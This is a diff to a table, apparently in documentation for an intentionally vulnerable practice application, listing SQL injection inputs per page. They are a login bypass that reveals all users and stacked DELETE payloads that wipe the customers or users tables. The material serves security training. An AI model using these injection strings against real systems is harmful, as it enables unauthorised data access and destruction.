@@ -76,4 +76,6 @@ Page | Input field | Value | Outcome
 --- | --- | --- | --- 
 Login | email | ```' OR ''='``` | Receive information of all existing users in the system
 Register | display name | ```display_name'); delete from customers where (''='``` | Prune customers table content 
-Add customer | address | ```address'); delete from users where (''='``` | Prune users table content 
+Add customer | address | ```address'); delete from customers where (''='``` | Prune customers table content 
+
+Note - you can of course also prune users table, not recommended as it makes the application crash.  
